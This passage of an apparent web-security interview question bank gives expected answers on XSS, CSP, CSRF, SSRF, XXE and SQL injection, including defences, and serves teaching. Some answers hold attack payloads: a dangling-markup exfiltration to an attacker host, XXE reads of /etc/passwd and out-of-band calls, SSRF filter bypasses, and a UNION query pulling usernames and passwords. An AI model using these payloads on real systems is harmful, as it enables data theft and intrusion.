**Expected Answer**: XSS in hidden inputs is frequently very difficult to exploit because typical JavaScript events like onmouseover and onfocus can't be triggered due to the element being invisible. The hidden input can be activated via an access key. The accesskey global attribute provides a hint for generating a keyboard shortcut for the current element. This means if you set accesskey="s" then depending on the browser (e.g. Firefox is Alt + Shift + key) the combination of Alt + Shift + s would trigger the hidden input field.

1. What is the difference between reflected XSS and stored XSS?  
**Expected Answer**: Reflected XSS arises when an application takes some input from an HTTP request and embeds that input into the immediate response in an unsafe way. With stored XSS, the application instead stores the input and embeds it into a later response in an unsafe way.

1. What is the difference between reflected XSS and self-XSS?  
**Expected Answer**: Self-XSS involves similar application behavior to regular reflected XSS, however it cannot be triggered in normal ways via a crafted URL or a cross-domain request. Instead, the vulnerability is only triggered if the victim themselves submits the XSS payload from their browser. Delivering a self-XSS attack normally involves socially engineering the victim to paste some attacker-supplied input into their browser. As such, it is normally considered to be a lame, low-impact issue.

1. What can XSS be used for?  
**Expected Answer**: 

   * Impersonate or masquerade as the victim user.
   * Carry out any action that the user is able to perform.
   * Read any data that the user is able to access.
   * Capture the user's login credentials: creating a password input, reading out the auto-filled password from password managers, and sending it to your own domain.
   * Perform virtual defacement of the web site.
   * Inject trojan functionality into the web site.

1. What is DOM-based cross-site scripting?  
**Expected Answer**: DOM-based XSS (also known as DOM XSS) arises when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM.

1. How are DOM-based XSS attack delivered?  
**Expected Answer**: To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript.

1. What is the most common source for DOM XSS?  
**Expected Answer**: The most common source for DOM XSS is the URL, which is typically accessed with the window.location object. An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL.

1. What is CSP (content security policy)?    
**Expected Answer**: CSP is a browser security mechanism that aims to mitigate XSS and some other attacks. It works by restricting the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages. To enable CSP, a response needs to include an HTTP response header called Content-Security-Policy with a value containing the policy. The policy itself consists of one or more directives, separated by semicolons.

1. Why should CSP not allow scripts from external domains such as content delivery networks (CDNs) that do not use per-customer URLs (e.g.`ajax.googleapis.com`)?  
**Expected Answer**: They should not be trusted, because third parties can get content onto their domains.

1. In addition to whitelisting specific domains, content security policy also provides what two other ways of specifying trusted resources?  
**Expected Answer**: Nonces and hashes:

   * The CSP directive can specify a nonce (a random value) and the same value must be used in the tag that loads a script. If the values do not match, then the script will not execute. To be effective as a control, the nonce must be securely generated on each page load and not be guessable by an attacker.
   * The CSP directive can specify a hash of the contents of the trusted script. If the hash of the actual script does not match the value specified in the directive, then the script will not execute. If the content of the script ever changes, then you will of course need to update the hash value that is specified in the directive.

1. What are some dangerous CSP configurations?  
**Expected Answer**: 

   * Allowing `unsafe-inline` in `script-src`: permits inline JavaScript (xss)
   * Using `unsafe-eval` in `script-src`: dynamic script execution
   * Overly Broad Source Directives like `script-src *`, `img-src *`: use `img` elements to make requests to external servers in order to disclose CSRF tokens

1. What is dangling markup injection?  
**Expected Answer**: Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible. Suppose that the application does not filter or escape the > or " characters. An attacker can use the `">` syntax to break out of the quoted attribute value (e.g. `<input value="CONTROLLABLE DATA`) and the enclosing tag, and return to an HTML context. Normally, an XSS would be performed, but due to CSP, input filters, or other obstacles it is not possible. It might still be possible to deliver a dangling markup injection attack using a payload like the following: `"><img src='//attacker-website.com?`. This payload creates an img tag and defines the start of a src attribute containing a URL on the attacker's server. Note that the attacker's payload doesn't close the src attribute, which is left "dangling". When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute. Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. Any non-alphanumeric characters, including newlines, will be URL-encoded.

1. What is the consequence of dangling markup injection?  
**Expected Answer**: The consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data. Depending on the application's functionality, this might include CSRF tokens, email messages, or financial data.

1. Is dangling markup only restricted to a few attributes?  
**Expected Answer**: No, any attribute that makes an external request can be used for dangling markup.

1. How to prevent dangling markup attacks?  
**Expected Answer**: You can prevent dangling markup attacks using the same general defenses for preventing cross-site scripting, by encoding data on output and validating input on arrival. You can also mitigate some dangling markup attacks using content security policy (CSP). For example, you can prevent some (but not all) attacks, using a policy that prevent tags like img from loading external resources. The Chrome browser has decided to tackle dangling markup attacks by preventing tags like img from defining URLs containing raw characters such as angle brackets and newlines. This will prevent attacks since the data that would otherwise be captured will generally contain those raw characters, so the attack is blocked.

1. How can an attacker exploit a strict Content Security Policy (CSP) like default-src 'none'; base-uri 'none'; using the HTML `<base>` tag, and what are the key steps in this attack method?  
**Expected Answer**: By injecting a malformed `<base>` tag into the web page, if there is an HTML injection. The attack involves leaving the target attribute of the `<base>` tag open, causing the browser to misinterpret subsequent HTML code as part of this attribute (e.g. `<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="blah`). This results in the manipulation of the window's target name, where the subsequent markup of the page (which could include sensitive data like CSRF tokens) is appended to this name. When a user clicks on a hyperlink, they are redirected to an attacker-controlled page with this window name, allowing the attacker to access the exposed data. The window.name property is persistent across page navigations within the same tab, and it's accessible cross-domain, making it a vector for data exfiltration.

1. How is CSP with policy injection performed?  
**Expected Answer**: A website that reflects input into the actual policy, most likely in a `report-uri` directive. If the site reflects a parameter that you can control, you can inject a semicolon to add your own CSP directives. Usually, this `report-uri` directive is the final one in the list. This means you will need to overwrite existing directives in order to exploit this vulnerability and bypass the policy.

1. How to protect against clickjacking using CSP?  
**Expected Answer**: `frame-ancestors 'self'` directive will only allow the page to be framed by other pages from the same origin. `frame-ancestors 'none'` directive will prevent framing altogether. Using content security policy to prevent clickjacking is more flexible than using the X-Frame-Options header because you can specify multiple domains and use wildcards. CSP also validates each frame in the parent frame hierarchy, whereas X-Frame-Options only validates the top-level frame. Using CSP to protect against clickjacking attacks is recommended. You can also combine this with the X-Frame-Options header to provide protection on older browsers that don't support CSP, such as Internet Explorer.

1. How to prevent XSS attacks?  
**Expected Answer**: 

   * Filter input on arrival. At the point where user input is received, filter as strictly as possible based on what is expected or valid input.
   * Encode data on output. At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
   * Use appropriate response headers. To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.
   * Content Security Policy. As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.


#### Cross-Site Request Forgery (CSRF)

1. What is CSRF?  
**Expected Answer**: Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

1. What is the impact of a CSRF attack?  
**Expected Answer**: In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally. For example, this might be to change the email address on their account, to change their password, or to make a funds transfer. 

1. How does CSRF work?  
**Expected Answer**: For a CSRF attack to be possible, three key conditions must be in place:

   * A relevant action: There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password).
   * Cookie-based session handling: Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.
   * No unpredictable request parameters. The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.

1. How do you construct a CSRF attack?  
**Expected Answer**: This is done by embedding a request in a hidden form or a script on an attacker controlled website. For example, if targeting a web application with a form submission (like a change of password form), the attacker would replicate the form on their own site. This form would have the same input fields and action attribute pointing to the target application's endpoint. However, the values would be set by the attacker. When the victim visits the attacker’s site, perhaps through a phishing link, and if they are already authenticated to the target application, submitting this form (either willingly or through automatic JavaScript submission) would send a legitimate-looking request to the target application. 

1. What are some common defenses against CSRF?  
**Expected Answer**: 

   * CSRF tokens: A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When attempting to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token in the request. This makes it very difficult for an attacker to construct a valid request on behalf of the victim.
   * SameSite cookies: SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. As requests to perform sensitive actions typically require an authenticated session cookie, the appropriate SameSite restrictions may prevent an attacker from triggering these actions cross-site. Since 2021, Chrome enforces Lax SameSite restrictions by default. As this is the proposed standard, we expect other major browsers to adopt this behavior in future.
   * Referer-based validation: Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. This is generally less effective than CSRF token validation.

1. What is a common way to share CSRF tokens with the client?  
**Expected Answer**: A common way to share CSRF tokens with the client is to include them as a hidden parameter in an HTML form: `<input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">`. Some applications place CSRF tokens in HTTP headers.

1. Why does a CSRF token when implemented correctly stop CSRF attacks?  
**Expected Answer**: CSRF tokens help protect against CSRF attacks by making it difficult for an attacker to construct a valid request on behalf of the victim. As the attacker has no way of predicting the correct value for the CSRF token, they won't be able to include it in the malicious request.

1. What are some flaws in CSRF token validation?  
**Expected Answer**: 

   * Validation of CSRF token depends on request method: Correctly validate the token when the request uses the POST method but skip the validation when the GET method is used. Simply switching the request to the GET method would bypass the CSRF token validation.
   * Validation of CSRF token depends on token being present: Correctly validate the token when it is present but skip the validation if the token is omitted.
   * CSRF token is not tied to the user session: Does not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.
   * CSRF token is tied to a non-session cookie: Some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together. This situation is harder to exploit but is still vulnerable. If the web site contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.
   * CSRF token is simply duplicated in a cookie: some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This is sometimes called the "double submit" defense against CSRF, and is advocated because it is simple to implement and avoids the need for any server-side state. The attacker can again perform a CSRF attack if the web site contains any cookie setting functionality. Here, the attacker doesn't need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.

1. What is SameSite?  
**Expected Answer**: SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. SameSite cookie restrictions provide partial protection against a variety of cross-site attacks, including CSRF, cross-site leaks, and some CORS exploits. 

1. What is a site in the context of SameSite cookies?  
**Expected Answer**: A site is defined as the top-level domain (TLD), usually something like `.com` or `.net`, plus one additional level of the domain name. This is often referred to as the TLD+1. When determining whether a request is same-site or not, the URL scheme is also taken into consideration. This means that a link from `http://app.example.com` to `https://app.example.com` is treated as cross-site by most browsers. ![](../Resources/site-definition.png)

1. What's the difference between a site and an origin?  
**Expected Answer**: The difference between a site and an origin is their scope; a site encompasses multiple domain names, whereas an origin only includes one. Although they're closely related, it's important not to use the terms interchangeably as conflating the two can have serious security implications. Two URLs are considered to have the same origin if they share the exact same scheme, domain name, and port. Although note that the port is often inferred from the scheme. ![](../Resources/site-vs-origin.png)

1. SameSite vs SameOrigin?
   | Request from | Request to | Same-site?| Same-origin? |
   | ----------- | ----------- | ----------- | ----------- |
   | https://example.com     | https://example.com       | ? | ? |
   | https://app.example.com   | https://intranet.example.com        | ? | ? |  
   | https://example.com   | https://example.com:8080        | ? | ? |  
   | https://example.com  | https://example.co.uk        | ? | ? |  
   | https://example.com	   | http://example.com        | ? | ? |  

   **Expected Answer**: 
   | Request from | Request to | Same-site?| Same-origin? |
   | ----------- | ----------- | ----------- | ----------- |
   | https://example.com     | https://example.com       | Yes | Yes |
   | https://app.example.com   | https://intranet.example.com        | Yes | No: mismatched domain name |  
   | https://example.com   | https://example.com:8080        | Yes | No: mismatched port |  
   | https://example.com  | https://example.co.uk        | No: mismatched eTLD | No: mismatched domain name |  
   | https://example.com	   | http://example.com        | No: mismatched scheme | No: mismatched scheme | 

1. How does SameSite work?  
**Expected Answer**: SameSite works by enabling browsers and website owners to limit which cross-site requests, if any, should include specific cookies. 


1. What are the SameSite restriction levels?  
**Expected Answer**: 

   * Strict: Browsers will not send it in any cross-site requests. If the target site for the request does not match the site currently shown in the browser's address bar, it will not include the cookie.
   * Lax: Browsers will send the cookie in cross-site requests, but only if both of the following conditions are met: The request uses the GET method; The request resulted from a top-level navigation by the user, such as clicking on a link. The cookie is not included in background requests, such as those initiated by scripts, iframes, or references to images and other resources.
   * None: This effectively disables SameSite restrictions altogether, regardless of the browser. As a result, browsers will send this cookie in all requests to the site that issued it, even those that were triggered by completely unrelated third-party sites.

1. What is an example that would necessitate SameSite=None?  
**Expected Answer**: There are legitimate reasons for disabling SameSite, such as when the cookie is intended to be used from a third-party context and doesn't grant the bearer access to any sensitive data or functionality. Tracking cookies are a typical example.

1. When setting a cookie with SameSite=None, what attribute must also be included?  
**Expected Answer**: The website must also include the Secure attribute, which ensures that the cookie is only sent in encrypted messages over HTTPS. Otherwise, browsers will reject the cookie and it won't be set.

1. How does bypassing SameSite Lax restrictions using GET requests work?  
**Expected Answer**: Servers aren't always fussy about whether they receive a GET or POST request to a given endpoint, even those that are expecting a form submission. If they also use Lax restrictions for their session cookies, either explicitly or due to the browser default, you may still be able to perform a CSRF attack by eliciting a GET request from the victim's browser. As long as the request involves a top-level navigation, the browser will still include the victim's session cookie. Even if an ordinary GET request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the _method parameter in forms, which takes precedence over the normal method for routing purposes

1. How does bypassing SameSite restrictions using on-site gadgets work?  
**Expected Answer**: If a cookie is set with the SameSite=Strict attribute, browsers won't include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site. One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters (DOM). As far as browsers are concerned, these client-side redirects aren't really redirects at all; the resulting request is just treated as an ordinary, standalone request. Most importantly, this is a same-site request and, as such, will include all cookies related to the site, regardless of any restrictions that are in place.

1. How does bypassing SameSite restrictions via vulnerable sibling domains work?  
**Expected Answer**: A request can still be same-site even if it's issued cross-origin. In particular, vulnerabilities that enable you to elicit an arbitrary secondary request, such as XSS, can compromise site-based defenses completely, exposing all of the site's domains to cross-site attacks. In addition to classic CSRF, don't forget that if the target website supports WebSockets, this functionality might be vulnerable to cross-site WebSocket hijacking (CSWSH), which is essentially just a CSRF attack targeting a WebSocket handshake.

1. How does bypassing SameSite Lax restrictions with newly issued cookies work?  
**Expected Answer**: Cookies with Lax SameSite restrictions aren't normally sent in any cross-site POST requests, but there are some exceptions. To avoid breaking single sign-on (SSO) mechanisms, it doesn't actually enforce these restrictions for the first 120 seconds on top-level POST requests. As a result, there is a two-minute window in which users may be susceptible to cross-site attacks. This two-minute window does not apply to cookies that were explicitly set with the SameSite=Lax attribute. Somewhat impractical to try timing the attack to fall within this short window. On the other hand, if you can find a gadget on the site that enables you to force the victim to be issued a new session cookie, you can preemptively refresh their cookie before following up with the main attack. For example, completing an OAuth-based login flow may result in a new session each time as the OAuth service doesn't necessarily know whether the user is still logged in to the target site.

1. What is the Referer header?  
**Expected Answer**: The HTTP Referer header is an optional request header that contains the URL of the web page that linked to the resource that is being requested. It is generally added automatically by browsers when a user triggers an HTTP request, including by clicking a link or submitting a form.

1. What are way to bypass Referer header validation?  
**Expected Answer**: 

   * Validation of Referer depends on header being present: Validates if header exists, skips if omitted. CSRF exploit will need to cause the victim user's browser to drop the Referer header. Easiest way is to use a META tag within the HTML page that hosts the CSRF attack: `<meta name="referrer" content="never">`
   * Validation of Referer can be circumvented: if the application validates that the domain in the Referer starts with the expected value, then the attacker can place this as a subdomain of their own domain: `http://vulnerable-website.com.attacker-website.com/csrf-attack`

1. How to prevent CSRF vulnerabilities?  
**Expected Answer**: CSRF tokens and SameSite

   * CSRF token must meet the following criteria: Unpredictable with high entropy; tied to the user's session; strictly validated in every case before the relevant action is executed.
   * Explicitly setting the SameSite restrictions with each cookie issued

1. The alternative approach, of placing the token into the URL query string, is somewhat less safe because the query string is?  
**Expected Answer**: 

   * Is logged in various locations on the client and server side
   * Is liable to be transmitted to third parties within the HTTP Referer header
   * Can be displayed on-screen within the user's browser

1. How should CSRF tokens be validated?  
**Expected Answer**: When a CSRF token is generated, it should be stored server-side within the user's session data. When a subsequent request is received that requires validation, the server-side application should verify that the request includes a token which matches the value that was stored in the user's session. This validation must be performed regardless of the HTTP method or content type of the request. If the request does not contain any token at all, it should be rejected in the same way as when an invalid token is present.


#### Server-Side Request Forgery (SSRF)

1. What is SSRF?  
**Expected Answer**: Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.

1. What is the impact of SSRF attacks?  
**Expected Answer**: A successful SSRF attack can often result in unauthorized actions or access to data within the organization. This can be in the vulnerable application, or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.

1. What are some ways to deal with an SSRF with blacklist-based input filters?  
**Expected Answer**: 

   * Use an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1.
   * Register your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose.
   * Obfuscate blocked strings using URL encoding or case variation.
   * Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an http: to https: URL during the redirect has been shown to bypass some anti-SSRF filters.

1. What are some ways to deal with an SSRF with whitelist-based input filters?  
**Expected Answer**: May be able to bypass this filter by exploiting inconsistencies in URL parsing:

   * Embed credentials in a URL before the hostname, using the @ character. For example: `https://expected-host:fakepassword@evil-host`
   * Use the # character to indicate a URL fragment. For example: `https://evil-host#expected-host`
   * Leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: `https://expected-host.evil-host`
   * URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try double-encoding characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.

1. What is blind SSRF?  
**Expected Answer**: Blind SSRF vulnerabilities arise when an application can be induced to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application's front-end response.

1. How to find and exploit blind SSRF vulnerabilities?  
**Expected Answer**: The most reliable way to detect blind SSRF vulnerabilities is using out-of-band (OAST) techniques. This involves attempting to trigger an HTTP request to an external system that you control, and monitoring for network interactions with that system.

1. How does SSRF via the Referer header work?  
**Expected Answer**: Some applications use server-side analytics software to tracks visitors. This software often logs the Referer header in requests, so it can track incoming links. Often the analytics software visits any third-party URLs that appear in the Referer header. This is typically done to analyze the contents of referring sites, including the anchor text that is used in the incoming links. As a result, the Referer header is often a useful attack surface for SSRF vulnerabilities. 

1. What are some SSRF mitigations?  
**Expected Answer**: 

   * Maintain a whitelist of allowed IPs or hostnames, and compare the resolved IP/hostname of the input URL against this list.
   * Employ network segmentation and firewall rules to limit the server’s ability to initiate requests to sensitive or internal resources.


#### XML External Entity (XXE) Injection

1. What is XML external entity injection?  
**Expected Answer**: XML external entity injection (XXE) allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access. In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other back-end infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks.

1. What is XML?  
**Expected Answer**: XML stands for "extensible markup language". XML is a language designed for storing and transporting data. Like HTML, XML uses a tree-like structure of tags and data. Unlike HTML, XML does not use predefined tags, and so tags can be given names that describe the data. 

1. What are XML entities?  
**Expected Answer**: XML entities are a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities `&lt;` and `&gt;` represent the characters `<` and `>`. These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data.

1. What is document type definition?  
**Expected Answer**: The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional DOCTYPE element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.

1. What are XML custom entities?  
**Expected Answer**: XML allows custom entities to be defined within the DTD. For example: `<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`. This definition means that any usage of the entity reference `&myentity;` within the XML document will be replaced with the defined value: "`my entity value`".

1. What are XML external entities?  
**Expected Answer**: XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared. The declaration of an external entity uses the SYSTEM keyword and must specify a URL from which the value of the entity should be loaded. For example: `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`. The URL can use the file:// protocol, and so external entities can be loaded from file. For example: `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`. XML external entities provide the primary means by which XML external entity attacks arise.

1. How do XXE vulnerabilities arise?  
**Expected Answer**: Some applications use the XML format to transmit data between the browser and the server. Applications that do this virtually always use a standard library or platform API to process the XML data on the server. XXE vulnerabilities arise because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application. XML external entities are a type of custom XML entity whose defined values are loaded from outside of the DTD in which they are declared. External entities are particularly interesting from a security perspective because they allow an entity to be defined based on the contents of a file path or URL.

1. What are the types of XXE attacks?  
**Expected Answer**: 

   * Exploiting XXE to retrieve files, where an external entity is defined containing the contents of a file, and returned in the application's response.
   * Exploiting XXE to perform SSRF attacks, where an external entity is defined based on a URL to a back-end system.
   * Exploiting blind XXE exfiltrate data out-of-band, where sensitive data is transmitted from the application server to a system that the attacker controls.
   * Exploiting blind XXE to retrieve data via error messages, where the attacker can trigger a parsing error message containing sensitive data.

1. How do you exploit XXE to retrieve files?  
**Expected Answer**: To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

   * Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.
   * Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

1. A shopping application checks for the stock level of a product by submitting the following XML to the server: 

   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <stockCheck><productId>381</productId></stockCheck>
   ```
   How would you perform an XXE to retrieve files?
**Expected Answer**: 

   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <stockCheck><productId>&xxe;</productId></stockCheck>
   ```
   This XXE payload defines an external entity `&xxe;` whose value is the contents of the /etc/passwd file and uses the entity within the productId value.

1. How do test systematically for XXE vulnerabilities?  
**Expected Answer**: Generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.

1. How do you exploit XXE to perform SSRF attacks?  
**Expected Answer**: Define an external XML entity using the URL that you want to target, and use the defined entity within a data value. If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the URL within the application's response, and so gain two-way interaction with the back-end system. If not, then you will only be able to perform blind SSRF attacks (which can still have critical consequences). `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`

1. How do you detect blind XXE?  
**Expected Answer**: 

   * Trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data. 
   * Trigger XML parsing errors in such a way that the error messages contain sensitive data.

1. How do you detect blind XXE using out-of-band (OAST) techniques?  
**Expected Answer**: Define an external entity as follows: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>`. Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. The declaration of an XML parameter entity includes the percent character before the entity name: `<!ENTITY % myparameterentity "my parameter entity value" >`. Parameter entities are referenced using the percent character instead of the usual ampersand `%myparameterentity;`. This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows: `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`.

1. How do you exploit blind XXE by repurposing a local DTD?  
**Expected Answer**: Due to a loophole in the XML language specification. If a document's DTD uses a hybrid of internal and external DTD declarations, then the internal DTD can redefine entities that are declared in the external DTD. When this happens, the restriction on using an XML parameter entity within the definition of another parameter entity is relaxed.Since this XXE attack involves repurposing an existing DTD on the server filesystem, a key requirement is to locate a suitable file. This is actually quite straightforward. Because the application returns any error messages thrown by the XML parser, you can easily enumerate local DTD files just by attempting to load them from within the internal DTD.

1. Where can you find hidden attack surfaces for XXE injection?  
**Expected Answer**: 

   * XInclude attacks
   * XXE attacks via file upload
   * XXE attacks via modified content type

1. What is an XInclude attack?  
**Expected Answer**: XInclude is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document. To perform an XInclude attack, you need to reference the XInclude namespace and provide the path to the file that you wish to include. For example:

   ```xml
   <foo xmlns:xi="http://www.w3.org/2001/XInclude">
   <xi:include parse="text" href="file:///etc/passwd"/></foo>
   ```

1. What is an XXE attacks via file upload?  
**Expected Answer**: Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.

1. How to find and test for XXE vulnerabilities?  
**Expected Answer**: 

   * Testing for file retrieval by defining an external entity based on a well-known operating system file and using that entity in data that is returned in the application's response.
   * Testing for blind XXE vulnerabilities by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system. Burp Collaborator is perfect for this purpose.
   * Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an XInclude attack to try to retrieve a well-known operating system file.

1. Can you use XML-based functionality for other vulnerabilities?  
**Expected Answer**: Yes, since XML is just a data transfer format you can also test any XML-based functionality for other vulnerabilities like XSS and SQL injection. You may need to encode your payload using XML escape sequences to avoid breaking the syntax, but you may also be able to use this to obfuscate your attack in order to bypass weak defences.

1. How to prevent XXE vulnerabilities?  
**Expected Answer**: Virtually all XXE vulnerabilities arise because the application's XML parsing library supports potentially dangerous XML features that the application does not need or intend to use. The easiest and most effective way to prevent XXE attacks is to disable those features. Generally, it is sufficient to disable resolution of external entities and disable support for XInclude. This can usually be done via configuration options or by programmatically overriding default behavior. Consult the documentation for your XML parsing library or API for details about how to disable unnecessary capabilities.

#### SQL Injection

1. What is SQL injection (SQLi)?  
**Expected Answer**: A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system.

1. How to detect SQL injection vulnerabilities?  
**Expected Answer**: You can detect SQL injection manually using a systematic set of tests against every entry point in the application. To do this, you would typically submit:

   * The single quote character `'` and look for errors or other anomalies.
   * Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
   * Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.
   * Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
   * OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.

1. What parts of a query can SQL injection occur?  
**Expected Answer**: Most SQL injection vulnerabilities occur within the `WHERE` clause of a `SELECT` query. However, SQL injection vulnerabilities can occur at any location within the query, and within different query types. Some other common locations where SQL injection arises are:

   * In `UPDATE` statements, within the updated values or the `WHERE` clause.
   * In `INSERT` statements, within the inserted values.
   * In `SELECT` statements, within the table or column name.
   * In `SELECT` statements, within the `ORDER BY` clause.

1. Describe a method by which SQL injection can be used to display all items in a database of this query: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1` where 'Gifts' is user input.  
**Expected Answer**: For example, an attacker might add a SQL comment (--) to the input, which comments out parts of the SQL query, thereby bypassing conditions like release status checks. In a URL, this could look like `Gifts'--`. This injection would cause the SQL query to ignore subsequent conditions, potentially revealing unreleased products or other restricted data.

1. Describe a method by which SQL injection can be used to display all items in a database, regardless of specific conditions or filters?  
**Expected Answer**: SQL injection can be used to display all items in a database by injecting a condition that is always true, thereby bypassing specific conditions or filters. An attacker could modify the input to include a universally true condition like 1=1, combined with a SQL comment to negate the rest of the query. For example, appending `'+OR+1=1--` to a query parameter would result in a SQL command like `SELECT * FROM products WHERE category = 'AnyCategory' OR 1=1--`. This modification ensures that the query ignores its intended filters and returns all items, as 1=1 is always true and the comment (--) negates any further conditions.

1. In cases where the application responds with the results of a SQL query, how can an attacker use a SQL injection vulnerability to retrieve data from other tables within the database?  
**Expected Answer**: The use the `UNION` keyword to execute an additional `SELECT` query and append the results to the original query. For example, if an application executes the following query containing the user input `Gifts`: `SELECT name, description FROM products WHERE category = 'Gifts'`. An attacker can submit the input: `' UNION SELECT username, password FROM users--`.

